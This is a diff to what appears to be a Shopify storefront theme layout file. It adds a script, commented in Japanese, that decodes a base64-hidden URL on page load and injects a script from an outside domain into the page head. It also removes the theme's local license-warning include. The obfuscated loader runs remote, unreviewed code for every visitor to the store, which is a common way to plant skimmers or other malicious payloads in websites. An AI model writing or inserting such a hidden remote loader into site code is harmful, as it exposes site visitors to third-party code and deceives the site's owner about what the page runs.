@@ -28,6 +28,31 @@
 
     {% render 'meta-tags' %}
 
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+          var encodedUrl = "aHR0cHM6Ly9naC1jaGVjay5jb20vbGljZW5zZS10ZXN0L2pzL2xpY2Vuc2Utd2FybmluZy5qcw==";
+          var decodedUrl = atob(encodedUrl); // URLをデコード
+
+          console.log("Decoded URL:", decodedUrl); // デコードされたURLを確認する
+
+          // スクリプトタグを動的に作成して挿入
+          var script = document.createElement('script');
+          script.src = decodedUrl; // デコードしたURLを使用
+          script.async = true; // 非同期で読み込む
+          document.head.appendChild(script); // スクリプトタグをheadに挿入
+
+          // スクリプトが正常にロードされたか確認
+          script.onload = function() {
+              console.log("Script loaded successfully");
+          };
+          script.onerror = function() {
+              console.error("Failed to load script");
+          };
+      });
+    </script>
+
+
     <script src="{{ 'constants.js' | asset_url }}" defer="defer"></script>
     <script src="{{ 'pubsub.js' | asset_url }}" defer="defer"></script>
     <script src="{{ 'global.js' | asset_url }}" defer="defer"></script>
@@ -299,8 +324,6 @@
   </head>
 
   <body class="gradient{% if settings.animations_hover_elements != 'none' %} animate--hover-{{ settings.animations_hover_elements }}{% endif %}">
-
-    {% render 'license-warning' %}
 
     <a class="skip-to-content-link button visually-hidden" href="#MainContent">
       {{ 'accessibility.skip_to_text' | t }}
